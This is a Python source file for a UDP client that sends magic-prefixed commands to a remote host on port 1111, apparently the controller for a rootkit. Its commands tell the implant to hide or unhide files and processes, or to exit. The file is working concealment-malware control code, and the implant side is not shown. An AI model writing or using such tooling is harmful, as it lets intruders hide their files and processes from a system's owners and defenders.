import random
import struct
import sys
from dataclasses import dataclass
from enum import Enum
from socket import socket, IPPROTO_UDP, SOCK_DGRAM, AF_INET, SocketType, timeout as TimeoutError
from threading import Condition, Thread

from typing import Dict

JOB_ID_SIZE = 2 * 8
REQUEST_PORT = 1111
MAGIC = b'mrk'


class CommandType(Enum):
    HIDE_FILE = b'hfile'
    UNHIDE_FILE = b'ufile'
    HIDE_PROCESS = b'hproc'
    UNHIDE_PROCESS = b'uproc'
    EXIT = b'fexit'


@dataclass
class Job:
    _id: int
    _type: str
    _arg: str


class Client:
    def __init__(self, timeout=2):
        self._sock: SocketType = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        # TODO: Should the socket just be non-blocking? That might slow down all other threads.
        self._sock.settimeout(0.1)
        self._timeout = timeout
        self._responses: Dict[int, bytes] = {}
        self._requests: Dict[int, Condition] = {}
        self._thread = Thread(target=self._listen_for_responses)
        self._should_stop = False
        self._thread.start()

    def _listen_for_responses(self):
        while not self._should_stop:
            try:
                response = self._sock.recv(3)
            except TimeoutError:
                continue
            job_id, response_status = struct.unpack('Hb', response)
            with self._requests.setdefault(job_id, Condition()):
                self._responses[job_id] = response_status
                self._requests[job_id].notify()

    def execute_on_remote(self, remote_ip: str, command: CommandType, argument: str = ''):
        job_id = random.randint(0, 2 ** JOB_ID_SIZE - 1)
        msg = MAGIC + struct.pack(f'H', job_id) + command.value + argument.encode('ascii')
        self._sock.sendto(msg, (remote_ip, REQUEST_PORT))
        with self._requests.setdefault(job_id, Condition()):
            has_result = self._requests[job_id].wait_for(lambda: job_id in self._responses, timeout=self._timeout)
        if not has_result:
            return None
        return self._responses[job_id]

    def close(self):
        self._should_stop = True
        self._thread.join()
        self._sock.close()


if __name__ == '__main__':
    s = Client()
    print(s.execute_on_remote(sys.argv[1], CommandType.UNHIDE_FILE, '/home/yanayg/test_file2'))
    s.close()
